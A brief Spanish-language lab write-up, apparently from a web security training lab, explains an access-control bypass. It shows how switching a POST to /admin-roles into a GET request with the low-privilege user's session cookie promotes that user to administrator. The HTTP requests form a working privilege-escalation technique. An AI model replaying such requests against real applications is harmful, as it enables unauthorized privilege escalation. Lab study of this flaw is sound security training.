# Bypass de control por método HTTP

Tags: #AccessControl #BurpSuite 

```bash 
En este lab la aplicación diferencia los permisos según el método HTTP. Se observa que un POST necesita privilegios, pero al cambiar el método a GET, el backend sigue procesando la solicitud sin aplicar el control adecuado. Al interceptar la petición original desde Burp y cambiar el método a GET, es posible promocionar a nuestro usuario sin ser administrador, aprovechando una validación deficiente basada únicamente en el verbo HTTP.
```

```bash 
# Petición original 
	POST /admin-roles  HTTP/2
	Cookie: session=12345
	
	username=omar&action=downgrade
```

```bash 
# Petición modificada de POST a GET
	GET /admin-roles?username=juan&action=upgrade  HTTP/2
	Cookie: session=54321
	
	
Notas: 
	1. Cambiar la cookie de sesión del usuario a usar 
```